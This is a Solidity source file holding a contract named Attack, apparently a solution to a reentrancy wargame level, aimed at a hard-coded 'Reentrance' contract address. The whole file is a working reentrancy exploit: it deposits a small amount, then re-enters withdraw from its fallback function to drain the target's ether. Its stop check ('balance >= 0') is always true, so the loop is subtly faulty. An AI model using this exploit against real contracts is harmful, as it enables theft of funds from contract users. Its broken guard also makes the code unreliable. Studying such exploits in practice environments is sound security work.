// SPDX-License-Identifier: UNLICENSED
pragma solidity "0.8.19";

interface IReentrancy {
    function transferToken() external;

    function balanceOf(address) external view returns (uint);

    function donate(address) external payable;

    function withdraw(uint) external;
}

// Reentrance address: 0xAae8c5268CD81271f608F89fCdA5c6904b5345C7

contract Attack {
    IReentrancy reentrancy;

    constructor(address payable _reentrancyAddr) {
        reentrancy = IReentrancy(_reentrancyAddr);
    }

    function attack() external payable {
        if (msg.value < 100000000000000 wei)
            revert("send 100000000000000 wei or more for attack");

        reentrancy.donate{value: 100000000000000 wei, gas: 40000000}(
            address(this)
        );
        reentrancy.withdraw(100000000000000 wei);
    }

    fallback() external payable {
        if (address(reentrancy).balance >= 0) {
            reentrancy.withdraw(100000000000000 wei);
        }
    }
}
